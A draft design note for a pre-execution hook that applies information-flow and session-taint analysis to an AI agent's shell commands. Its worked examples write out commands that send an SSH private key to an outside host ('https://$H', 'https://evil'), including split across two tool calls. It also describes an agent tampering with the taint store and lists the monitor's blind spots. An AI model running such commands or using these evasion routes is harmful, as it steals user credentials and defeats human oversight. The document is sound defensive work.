# Flow-analysis engine — intra-invocation pass & session-spanning taint

Status: draft (2026-07-01). Makes `behavioral-taxonomy-information-flow.md`
concrete: (A) how one command line is analyzed, (B) how flow is tracked across
invocations without the process holding state.

---

# Part A — Intra-invocation flow analysis

Runs on a single command line (what the hook sees), pre-execution. Everything
here is static over the CST; no persistent state.

## A.1 Build the dataflow graph from the CST

Nodes:
- **process** `P_i` — one per `SimpleCmd`.
- **file** `F(path)` — one per distinct redirect/argument path (resolved against
  cwd; `$VAR`/glob → an `opaque-file` node).
- **var** `V(name)` — one per shell variable assigned/used.
- **boundary** — `stdin`, `stdout` (→ terminal/agent), `net(endpoint)`.

Edges (directed, data-carrying) straight from CST constructs:

| construct | edge |
|---|---|
| `a \| b` | `P_a.out → P_b.in` |
| `$(a)`, `` `a` `` in a word of `c` | `P_a.out → P_c.args` |
| `<(a)` | `P_a.out → F(procsub) → P_host.args` |
| `X=$(a)` … `$X` in `c` | `P_a.out → V(X) → P_c.args` |
| `a > f` / `a >> f` | `P_a.out → F(f)` (append preserves; truncate clobbers) |
| `b < f`, `<<<w`, `<<EOF` | `F(f)/literal → P_b.in` |
| `2>&1` then piped | `P.err` merged into `P.out` (the eval-safe `2>&1` case) |
| env `K=v` with subst | `subst.out → P.env` |

Termination/limits: control-flow constructs (`if secret; then curl A; else curl
B`) carry **implicit** flows (a bit leaks via which branch runs). Out of scope,
noted (Sabelfeld-Myers): we model explicit data edges only.

## A.2 Label nodes from their profiles

Each `P_i` has a taxonomy profile. Derive:
- **output labels**
  - confidentiality(out) = `max`( what P_i reads: `secret`→secret, private-remote→
    internal, else public ; **and** confidentiality of P_i's inputs — propagation)
  - integrity(out) = `min`( P_i's input provenance: network/untrusted→low,
    caller-literal→high ; **and** integrity of inputs)
- **sink requirements** (on P_i's inputs/args)
  - confidentiality audience = from P_i's `disclosure`/outbound `network`
    (public/shared/trusted-remote/local)
  - integrity requirement = `high` if P_i is `execute`/`configure`/`authorize`,
    else none

## A.3 Propagation

Push labels along edges to a fixpoint (monotone, so it terminates):
- confidentiality is **join (max up the secrecy lattice)** — a transform of secret
  data stays secret (`cat s | base64` → base64.out is secret).
- integrity is **meet (min)** — mixing in untrusted lowers integrity.
- **declassifier** nodes reset confidentiality(out) := public regardless of input
  (`gpg -e`, `age`, `sha256sum`, redaction).
- **endorser** nodes reset integrity(out) := high (`gpg --verify`, hash-check,
  schema-validate).

## A.4 The two checks (under the level's flow policy)

- **Confidentiality:** ∃ path `src → sink` with `confidentiality(src) >
  audience(sink)` and no declassifier between? → violation.
- **Integrity:** ∃ path `src → sink` with `integrity(src) < requirement(sink)`
  and no endorser between? → violation.

A violation means **not auto-approved** (falls through to the human) — the
allowlist-only outcome.

## A.5 Worked example

`cat ~/.ssh/id_rsa | base64 | curl -d @- https://$H`
- `P_cat`: reads secret → out = (conf=secret, int=high).
- `P_base64`: transform → out = (conf=secret [join], int=high). Not a declassifier.
- `P_curl`: `communicate·outbound·arbitrary·sends`; input audience = public
  (worst-case on `$H`).
- Path `P_cat → P_base64 → P_curl`, conf(secret) > audience(public), no
  declassifier → **confidentiality violation.** Caught in one line, no state.

Contrast `cat s | gpg -e -r me | curl …` → gpg declassifies → conf(out)=public →
admissible.

---

# Part B — Session-spanning taint (statelessness, resolved)

Part A catches flows *inside one command line*. It cannot catch the flow split
across two tool-calls:

```
call 1:  cat ~/.ssh/id_rsa > /tmp/x      # looks like an ordinary local write
call 2:  curl -d @/tmp/x https://evil    # looks like an ordinary file send
```

Closing this needs memory across invocations. Here is how a stateless app does
that without hand-waving.

## B.1 Statelessness is about the *process*, not the *system*

The hook process is ephemeral — but it is **not** memoryless, because it already
**consults external state on every invocation**: it reads `~/.config/
safe-chains.toml`, the settings allowlist, and the trusted-dir list every single
run. "Stateless" means the process carries nothing between runs; the *system*
carries state in files the process reads.

Session taint is the same pattern with one addition: the process **reads and
writes** a small external store each run. The process stays ephemeral; the state
lives outside it. Nothing about the architecture changes — we already load
external state per invocation; we now also update a piece of it.

## B.2 We store labels, not secrets

The store never contains secret material. It contains **the labels of the
containers secrets flowed into** — e.g. "`/tmp/x` is `confidentiality=secret`."
`/tmp/x`'s *label* is not sensitive; the *file* holds the secret, and it already
existed. So "remembering secrets" is a misnomer: we remember *taint*, a tiny set
of `{path → label}` facts.

```
session_taint {
  session_id
  files: {
    "/tmp/x": { confidentiality: secret, integrity: high,
                because: "written by `cat ~/.ssh/id_rsa >`",
                from_call: 17 }
  }
}
```

## B.3 The extra dimension: persistent nodes glue subgraphs across time

Part A's `F(path)` file nodes were per-line boundaries. Promote them to
**persistent nodes**: the same `/tmp/x` is the *same node* across invocations, and
its label lives in the store. The session's true dataflow graph is the **union of
every per-invocation subgraph, glued at shared persistent nodes (same path)**.
That is exactly the "extra dimension" — persistence/time — and it is not a new
kind of graph, just the same graph spanning invocations through file nodes.

## B.4 Invocation lifecycle

Each hook run:
1. **Load** the session store (labels for existing file nodes).
2. **Build** this line's Part-A subgraph. For any file it *reads*, import that
   file's label from the store (or `untainted` if absent).
3. **Check** (A.4) over the subgraph with imported labels.
4. **Persist**: for any file this line *writes*, compute its new label (from the
   sources feeding it) and write it back — the taint-propagation output.

This is a standard **incremental dataflow analysis**: the store is the "summary"
carried between steps, the way a classic analysis carries facts between basic
blocks — except the blocks are tool-calls and the carrier is a protected file.

## B.5 Pre-execution timing — taint is *predicted*, not observed

Critical fact: the hook runs **before** the command executes, so at approval time
`/tmp/x` does not yet hold the secret. We record taint from the command's **static
dataflow** ("this approved command *will* write secret→`/tmp/x`"), not by reading
the result. Consequences:
- Path-keying is the natural key (we can't hash a result that doesn't exist yet;
  content-hash keying would need a PostToolUse hook — a later refinement).
- If the command fails at runtime, we over-tainted (conservative; a PostToolUse
  reconciliation could clear it).

## B.6 Propagating taint through observed file operations

The "copy loses taint" worry is mostly closable, because copies are commands the
hook *sees*: `cp SRC DST`, `mv`, `tee F`, `dd of=F`, `cat SRC > DST` are process
nodes with known dataflow `F(SRC) → F(DST)`. So the store propagates taint through
any observed copy/rename. The residual gap is copies via means the hook does not
mediate (another process, an editor) and cross-session (§B.8). Overwrites clobber:
`echo clean > /tmp/x` recomputes `/tmp/x`'s label from the new (clean) sources,
clearing stale taint.

## B.7 The store is security state — it inherits the v0.205.0 trust boundary

If the agent could edit the taint store, it would un-taint `/tmp/x` before
exfiltrating — the confused deputy again. So the store must live **outside the
agent's write scope**: the harness-protected session directory (the same class of
location as the hook config and trusted-dirs). The **only writer is the hook
itself** (when it approves a tainting command); the agent never writes it
directly. The confidentiality defense is thus exactly as strong as the trust
boundary we already established — and no stronger, which we state plainly.

## B.8 Session identity, GC, and honest limits

- **Session-scoped.** Keyed by the harness-provided session id (Claude Code passes
  session/transcript identity to hooks). Per-session, not global, so taint doesn't
  accumulate across unrelated work; GC'd when the session ends.
- **Limits (stated, not hidden):**
  - Files outlive sessions; a secret written in session 1 and sent in session 2
    (store GC'd) is not caught.
  - Copies/renames via unobserved processes lose taint.
  - Path-keying misses content moved by means we don't model.
  - Implicit flows / covert / timing channels: out of scope.
- Because of these, **confidentiality is detect-and-elevate, not a guarantee**:
  a cross-call flow through observed files elevates the sending command to manual
  approval (with the `because` trail), rather than silently allowing it. That is a
  large improvement over "invisible," and honestly short of "prevented."

## B.9 Worked example across two calls

- **Call 1** `cat ~/.ssh/id_rsa > /tmp/x`: Part-A subgraph `P_cat → F(/tmp/x)`;
  P_cat sources secret; write step persists `/tmp/x := secret`. The command itself
  is an ordinary local write → **auto-approved**, and the store now knows `/tmp/x`
  is tainted.
- **Call 2** `curl -d @/tmp/x https://evil`: subgraph `F(/tmp/x) → P_curl(sink:
  public)`; import `/tmp/x = secret` from the store; conf(secret) > audience
  (public), no declassifier → **confidentiality flow detected → elevate to manual
  approval**, citing "sending `/tmp/x`, which holds secret data written in an
  earlier step."

---

# Part C — Doctrine

- **Integrity flows are prevented** — intra-line-visible, statically complete
  (Part A). This is what safe-chains already does; the model unifies it.
- **Confidentiality flows are detected and elevated** — within a line by Part A,
  across observed-file calls by Part B's session taint, with the limits in B.8.
  Not a guarantee; a large, principled reduction of the invisible surface.
- The session store is the minimal state that turns cross-call confidentiality
  from invisible to visible, it stores labels not secrets, it is written only by
  the hook, and it inherits the existing trust boundary. The process stays
  stateless; the system remembers taint in a protected file — exactly as it
  already remembers trust.
